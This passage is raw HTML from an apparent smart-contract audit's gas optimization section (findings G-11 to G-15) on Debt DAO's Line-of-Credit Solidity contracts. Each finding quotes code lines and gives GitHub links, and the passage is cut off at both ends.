class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ISpigot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReentrancyGuard</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit computeId(), getOutstandingDebt(), calculateValue(), create(), repay(), withdraw(), accrue()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L14\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L14</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditListLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit removePosition(), stepQ()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CreditListLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L10\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L10</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _getLatestCollateralRatio(), _getCollateralValue(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate(), isLiquidatable(), updateLine()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L21\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L21</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactoryLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit rolloverSecuredLine(), transferModulesToLine(), deploySecuredLine()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LineFactoryLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L7\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L7</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit sendOutTokenOrETH(), receiveTokenOrETH(), getBalance()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L14\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L14</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claimAndTrade(), trade(), rollover(), canDeclareInsolvent(), updateSplit(), releaseSpigot(), sweep()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L10\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L10</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _claimRevenue(), operate(), claimRevenue(), claimEscrow(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L23\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L23</a></p>\n<h2 id=\"g11--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g11--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g11  usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11]  Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</h2>\n<blockquote>\n<p>When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.</p>\n</blockquote>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\">https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html</a>\nEach operation involving a <code>uint8</code> costs an extra <a href=\"https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977\"><strong>22-28 gas</strong></a> (depending on whether the other operand is also a variable of type <code>uint8</code>) as compared to ones involving <code>uint256</code>, due to the compiler having to clear the higher bits of the memory word before operating on the <code>uint8</code>, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uint8 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uint8 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = !</span><span class=\"mtk12\">passed</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140</a></p>\n<h2 id=\"g12--using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g12--using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g12  using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12]  Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L21\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L21</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">defaultRevenueSplit</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L32\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L32</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minimumCollateralRatio</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L24\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L24</a></p>\n<h2 id=\"g13--inverting-the-condition-of-an-if-else-statement-wastes-gas\" style=\"position:relative;\"><a href=\"#g13--inverting-the-condition-of-an-if-else-statement-wastes-gas\" aria-label=\"g13  inverting the condition of an if else statement wastes gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13]  Inverting the condition of an <code>if</code>-<code>else</code>-statement wastes gas</h2>\n<p>Flipping the <code>true</code> and <code>false</code> blocks instead saves <strong><em><a href=\"https://gist.github.com/IllIllI000/44da6fbe9d12b9ab21af82f14add56b9\">3 gas</a></em></strong>.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = !</span><span class=\"mtk12\">passed</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L145\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L145</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">                   </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> = !</span><span class=\"mtk12\">is4626</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">                       ? </span><span class=\"mtk12\">token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:                      : </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddrBytes</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L122-L124\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L122-L124</a></p>\n<h2 id=\"g14--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g14--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g14  require or revert statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14]  <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (<strong>2100 gas*</strong>) in a function that may ultimately revert in the unhappy case.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit expensive op on line 324</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">326</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326</a></p>\n<h2 id=\"g15--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g15--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g15  use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15]  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">lineContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;InterestRateCred: only line contract.&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:           